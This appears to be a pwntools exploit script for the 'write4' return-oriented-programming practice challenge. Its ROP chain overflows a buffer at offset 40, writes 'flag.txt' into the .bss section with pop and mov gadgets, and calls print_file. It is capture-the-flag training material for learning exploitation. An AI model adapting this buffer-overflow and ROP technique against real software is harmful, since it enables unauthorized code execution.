from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./write4"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()
offset = 40

mov_r14_r15 = 0x0000000000400628
bss = elf.bss()
pop_r14_r15 = 0x0000000000400690
pop_rdi = 0x0000000000400693

payload = flat(
    {
        offset: [
            pop_r14_r15,
            bss,
            "flag.txt",
            mov_r14_r15,
            pop_rdi,
            bss,
            elf.sym["print_file"],
        ]
    }
)

io.sendline(payload)

io.interactive()
